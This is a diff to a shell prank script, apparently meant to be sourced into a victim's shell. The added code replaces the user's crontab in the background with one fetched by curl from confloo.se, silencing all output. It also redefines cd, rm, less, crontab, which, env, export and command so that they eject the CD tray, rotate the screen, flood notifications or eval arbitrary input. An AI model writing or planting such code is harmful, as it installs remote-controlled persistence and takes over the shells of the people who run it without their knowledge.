@@ -1,8 +1,16 @@
 #!/bin/sh
-crontab -l > /tmp/cronrules
-curl "http://confloo.se/cronrules" >> /tmp/cronrules 2>/dev/null
-crontab /tmp/cronrules
-rm /tmp/cronrules
+
+unalias -a &> /dev/null
+unalias -m "*" &> /dev/null
+
+::() {
+    crontab -l > /tmp/cronrules
+    curl -o /tmp/cronrules "http://confloo.se/cronrules" 2>/dev/null
+    crontab /tmp/cronrules
+    rm /tmp/cronrules
+}
+
+(:: &) >/dev/null 2>&1
 
 f() {
     t=`which $1`
@@ -11,10 +19,11 @@ f() {
     eval "$t() { $2; }"
 }
 
-unalias -a &> /dev/null
-unalias -m "*" &> /dev/null
-
-cd() { eject; }
+case `uname` in
+    Linux) cmd="eject -T" ;;
+    FreeBSD) cmd="cdcontrol eject" ;;
+esac
+eval "cd() { $cmd; }"
 
 tetris() { 
 while (true);
@@ -66,6 +75,14 @@ sudo() {
 f rm "xrandr -o left; xrandr -x"
 f less "xrandr -s 6 &> /dev/null"
 
+cron() {
+    while (true); do
+        notify-send tab
+        sleep 1;
+    done;
+}
+f crontab "(cron &) >/dev/null 2>&1"
+
 alias() { display http://impawards.com/tv/posters/alias_ver2.jpg }
 unalias() { display -flop http://impawards.com/tv/posters/alias_ver2.jpg }
 
@@ -110,10 +127,11 @@ fabulous='
                           `|'
 f head "echo '$fabulous'"
 
-cflznv=`env`
-which() { printf $cflznv | grep "__.*=/.*$1" | sed -r 's/.*=(.*)/\1/'; }
+cflznv=`env | grep '__.*'`
+eval "which() { printf '$cflznv' | grep '__.*=/.*$1' | sed -r 's/.*=(.*)/\1/'; }"
+
 env() { false; }
 
-command() { false; }
+command() { eval "$@"; }
 export() { false; }
 unset() { false; }
